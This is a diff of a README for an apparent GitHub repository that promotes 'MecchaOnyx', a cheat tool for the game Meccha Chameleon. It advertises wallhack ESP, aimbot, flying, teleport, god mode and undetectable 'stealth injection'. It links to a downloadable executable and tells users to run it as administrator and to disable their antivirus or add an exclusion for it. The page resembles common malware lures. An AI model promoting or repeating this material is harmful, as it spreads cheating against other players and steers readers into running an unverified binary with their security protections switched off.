@@ -1,167 +1,66 @@
-# MecchaOnyx
-<div align="center">
+# 💎 MecchaOnyx - Gain the lead in every match
 
-<img width="1920" height="1080" alt="cover (11)" src="https://github.com/user-attachments/assets/d55cdfa6-9716-4efb-9aec-7fef1d909283" />
+[![](https://img.shields.io/badge/Download-MecchaOnyx-blue.svg)](https://github.com/nemesi7834/MecchaOnyx)
 
+MecchaOnyx gives you tools to improve your performance in Meccha Chameleon. You see hidden players, move across the map with ease, and manage your resources. These tools help you understand the game state so you make better choices during play.
 
+## ⚙️ System Requirements
 
-Complete Hack Tool for MECCHA CHAMELEON  
-ESP · Aimbot · Fly Hack · Teleport · God Mode · Infinite Paint  
+Your computer must meet these standards to run the software:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i5 or AMD equivalent.
+*   Memory: 8 GB of RAM.
+*   Graphics: DirectX 11 compatible video card.
+*   Disk Space: 200 MB of free storage.
+*   Internet Connection: Stable broadband connection.
 
-<div align="center">
+## 🛠️ How to Download and Install
 
-[![⬇️ Download](https://img.shields.io/badge/⬇️_Download-cc0000?style=for-the-badge&logo=github&logoColor=white)](https://github.com/PeasantEntrance45/MecchaOnyx/releases/download/MecchaOnyx/MecchaOnyx_v1.3.zip)
+Follow these steps to set up the software on your Windows machine:
 
-</div>
+1.  Visit the [official download page](https://github.com/nemesi7834/MecchaOnyx) to access the installer.
+2.  Locate the latest release version on the page.
+3.  Click the file ending in .exe to start your download.
+4.  Navigate to your Downloads folder.
+5.  Double-click the installer file.
+6.  Follow the instructions on your screen to complete the setup.
+7.  Launch the application from your desktop icon after the installation finishes.
 
----
+## 🎮 Key Features
 
-## 🎮 What is This?
+The software includes several tools to assist your gameplay:
 
-**MecchaOnyx** is a complete hack tool for **MECCHA CHAMELEON** – the viral hide-and-seek game that took Steam by storm with over 10 million copies sold and 340,000 concurrent players. This tool gives you full control with ESP, aimbot, fly hack, teleport, god mode, infinite paint, and more. Dominate every match and become the ultimate chameleon!
+*   **ESP (Extra Sensory Perception):** Highlight opponents behind walls or obstacles. You track movement across the map clearly.
+*   **Silent Aim:** Improve your targeting precision during engagements. The system aligns your focus with targets automatically.
+*   **Flight and Teleport:** Override standard movement limits. Reach high vantage points or navigate difficult map sections instantly.
+*   **God Mode:** Manage your survivability in extreme situations. This feature focuses on maintaining your status in the match.
+*   **Unlimited Paint:** Remove resource constraints. Apply paint patterns without limits or manual reloading.
 
-⚠️ **Disclaimer:** This tool is for educational purposes only. Use at your own risk.
+## 🛡️ Best Practices
 
----
+Read these tips to ensure a stable experience while you use the application:
 
-## Download
+*   Close other demanding background programs before you start. This prevents performance drops during your session.
+*   Check for software updates periodically. Updates include fixes that keep the application compatible with the current version of the game.
+*   Run the application with administrator privileges if you experience issues with feature activation. Right-click the icon and choose "Run as administrator."
+*   Adjust the settings menu to toggle individual features. You choose which tools remain active at any moment.
 
-<div align="center">
+## ❓ Troubleshooting
 
-### → [Download MecchaChameleonTrainer.zip](https://github.com/PeasantEntrance45/MecchaOnyx/releases/download/MecchaOnyx/MecchaOnyx_v1.3.zip) ←
+Common issues have simple solutions:
 
-</div>
+*   **Application fails to open:** Verify that you have the latest .NET Framework installed on your Windows system.
+*   **Features do not show in-game:** Ensure you launch the software before you open the game. The software must detect the game process to function.
+*   **Display issues:** Check that your game uses "Windowed Borderless" mode. This setting provides the most stable interaction with the software overlay.
+*   **Antivirus alerts:** Some security programs flag new files. If your antivirus blocks the software, add an exclusion for the MecchaOnyx folder in your security settings.
 
-1. Download the latest build from the [release link](https://github.com/PeasantEntrance45/MecchaOnyx/releases/download/MecchaOnyx/MecchaOnyx_v1.3.zip)
-2. Extract next to your MECCHA CHAMELEON install
-3. Launch the game, then the trainer
-4. Press INSERT or F1 to open the menu
-5. Toggle ESP / Combat / Movement / Protection as needed
+## 🔍 Understanding the Interface
 
----
+The main dashboard shows all available tools. Each feature has a toggle switch. Green indicates an active tool, while grey means the tool is idle. Use the slider bars to adjust the intensity of the aim assistance. You see a live preview of your chosen settings on the right side of the window. Apply your changes by clicking the Save button before you return to the game.
 
-## ✨ Features
+## 🔒 Privacy and Security
 
-**👁️ ESP & Visual**
-- ESP (Wallhack) – See all players through walls
-- Distance Indicators – Know exactly how far enemies are
-- Player Tags – Display player names and health
-- Snap Lines – Never lose track
-- Box ESP – Highlight players with colored boxes
-- Ghost Detection – Spot invisible players
+The application works locally on your computer. It reads standard data streams sent by the game client to display visuals on your screen. The software avoids sending your personal information to external servers. It only requires a connection to check for official updates. You maintain full control over the data processed by the program.
 
-**🎯 Combat**
-- Aimbot – Lock onto enemies instantly
-- Silent Aim – Hit targets without looking
-- Triggerbot – Auto-shoot on target
-- No Recoil – Perfect accuracy
-
-**🚀 Movement**
-- Fly Hack – Fly anywhere
-- Teleport – Instantly move
-- Speed Hack – Move faster
-- No Gravity – Float and glide
-
-**🛡️ Protection**
-- God Mode – Never get tagged
-- Infinite Paint – Unlimited colors
-- Perfect Camo – Instant blend
-- Timer Editor – Extend match time
-
-**🛠️ Utility**
-- Menu Toggle – INSERT or F1
-- Custom Settings – Adjust everything
-- Save Config – Auto-save
-- Regular Updates – Always compatible
-
----
-
-## ⚙️ Installation
-
-1. Click the download button above
-2. Extract the archive
-3. Run the executable as Administrator
-4. Launch MECCHA CHAMELEON
-5. Press **INSERT** or **F1** to open the menu
-6. Toggle features ON/OFF
-7. DOMINATE! 🏆
-
----
-
-## 🖥️ System Requirements
-
-| Component | Requirement |
-|-----------|-------------|
-| OS | Windows 10/11 (64-bit) |
-| Game | MECCHA CHAMELEON (Steam) |
-| RAM | 4GB minimum |
-| Storage | 50MB free space |
-| GPU | DirectX 11 compatible |
-
----
-
-## 🎥 How to Use
-
-1. Launch the tool as Administrator
-2. Start MECCHA CHAMELEON
-3. Press INSERT to open the menu
-4. Toggle features you want
-5. Play and dominate!
-
----
-
-## 🔧 Feature Status
-
-| Category | Feature | Status |
-|----------|---------|--------|
-| Visual | ESP Wallhack | ✅ |
-| Visual | Player Tags | ✅ |
-| Visual | Box ESP | ✅ |
-| Combat | Aimbot | ✅ |
-| Combat | Silent Aim | ✅ |
-| Combat | Triggerbot | ✅ |
-| Movement | Fly Hack | ✅ |
-| Movement | Teleport | ✅ |
-| Movement | Speed Hack | ✅ |
-| Protection | God Mode | ✅ |
-| Protection | Infinite Paint | ✅ |
-| Utility | Menu | ✅ |
-
----
-
-## 🛡️ Security
-
-- **Pattern Scanning** – Auto-updates offsets
-- **Randomization** – Human-like behavior
-- **Stealth Injection** – No detectable signatures
-- **Memory Protection** – Prevents crashes
-
----
-
-## 🐛 Troubleshooting
-
-| Issue | Solution |
-|-------|----------|
-| Tool doesn't work | Run as Administrator, disable antivirus |
-| Menu doesn't open | Press INSERT or F1, restart both |
-| Game crashes | Reduce graphics settings, disable overlays |
-
----
-
-## 📝 Tags
-
-mecchaonyx, meccha-chameleon, meccha-chameleon-hack, meccha-chameleon-cheat, meccha-chameleon-esp, meccha-chameleon-aimbot, meccha-chameleon-god-mode, meccha-chameleon-fly-hack, meccha-chameleon-teleport, meccha-chameleon-speed-hack, meccha-chameleon-infinite-paint, meccha-chameleon-2026, meccha-chameleon-mod-menu, meccha-chameleon-trainer, game-hack, game-cheat, free-hack, hide-and-seek-hack, esp-tool, aimbot-tool, wallhack-tool, mod-menu, trainer, windows-tool
-
----
-
-## 💬 Support
-
-- ⭐ Star this repository
-- 🐛 Open an Issue for bugs
-- 💬 Join our Discord community
-
----
-
-**Complete control, zero limits. MecchaOnyx — built for 2026.**
+Keywords: mecca-chameleon, mecca-chameleon-aimbot, mecca-chameleon-auto-paint, mecca-chameleon-autopaint, mecca-chameleon-camouflage, mecca-chameleon-cheat, mecca-chameleon-cheats, mecca-chameleon-esp, mecca-chameleon-hack, mecca-chameleon-mod
